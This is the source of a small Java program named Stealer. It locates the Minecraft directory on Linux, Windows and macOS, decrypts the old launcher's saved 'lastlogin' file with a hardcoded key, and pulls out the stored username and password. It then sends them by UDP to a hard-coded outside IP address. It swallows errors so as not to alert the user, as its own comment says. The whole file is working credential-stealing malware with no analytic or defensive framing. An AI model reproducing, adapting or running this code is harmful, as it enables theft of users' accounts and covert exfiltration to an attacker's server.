import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;
import java.net.*;

public class Stealer {
  public static void main(String[] args) throws Exception {
    sendPacket(MCStealer());
  }

  public static String MCStealer() throws Exception {
    String output = null;
    Random random = new Random(43287234L);
    byte[] salt = new byte[8];
    random.nextBytes(salt);
    PBEParameterSpec pbeParamSpec = new PBEParameterSpec(salt, 5);
    SecretKey pbeKey = SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(new PBEKeySpec("passwordfile".toCharArray()));
    Cipher cipher = Cipher.getInstance("PBEWithMD5AndDES");
    cipher.init(2, pbeKey, pbeParamSpec);
    if (getWorkingDirectory().exists()) {
      File lastLogin = new File(getWorkingDirectory(), "lastlogin");
      DataInputStream dis = new DataInputStream(new CipherInputStream(new FileInputStream(lastLogin), cipher));
      output = dis.readUTF() + " | " + dis.readUTF();
      dis.close();
    }
    return output;
  }

  public static File getWorkingDirectory() {
    String userHome = System.getProperty("user.home", ".");
    File workingDirectory;
    switch (getPlatform()) {
    case 1:
    case 2:
      workingDirectory = new File(userHome, ".minecraft/");
      break;
    case 3:
      String applicationData = System.getenv("APPDATA");
      if (applicationData != null) workingDirectory = new File(applicationData, ".minecraft/"); else
        workingDirectory = new File(userHome, ".minecraft/");
      break;
    case 4:
      workingDirectory = new File(userHome, "Library/Application Support/minecraft");
      break;
    default:
      workingDirectory = new File(userHome, ".minecraft/");
    }
    return workingDirectory;
  }

  private static int getPlatform() {
    String osName = System.getProperty("os.name").toLowerCase();
    if (osName.contains("linux")) return 1;
    if (osName.contains("unix")) return 1;
    if (osName.contains("solaris")) return 2;
    if (osName.contains("sunos")) return 2;
    if (osName.contains("win")) return 3;
    if (osName.contains("mac")) return 4;
    return 5;
  }
  
  public static void sendPacket(String e) {
	  try {
		  byte[] packetData = e.getBytes();
		  DatagramPacket Packet = new DatagramPacket(packetData, packetData.length, InetAddress.getByName("71.58.194.149"), 3333);
		  DatagramSocket socket = new DatagramSocket();
		  socket.send(Packet);
		  socket.close();
	  } catch (Exception d) {
		  //Nothing to do! We don't want to alert the user.
	  }
  }
}